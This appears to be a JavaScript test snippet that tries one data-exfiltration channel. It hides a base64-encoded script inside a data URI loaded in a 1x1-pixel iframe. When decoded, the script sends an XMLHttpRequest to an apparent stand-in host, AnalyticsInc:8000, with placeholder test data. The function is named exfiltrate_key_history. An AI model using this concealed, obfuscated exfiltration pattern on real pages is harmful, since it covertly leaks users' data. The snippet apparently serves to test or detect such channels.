function exfiltrate_key_history() {

    // Data URI 5 - iFrame Embed - Base64
    // Exfiltrate data using XMLHTTP request
	var data = 'PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD1kYXRhNSIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=';
    var URL = 'data:text/html;charset=utf-8;base64,' + data;
    var script = document.createElement("iframe");
    script.src = URL;
    script.style.width="1px";
    script.style.height="1px";
	document.getElementsByTagName('body')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
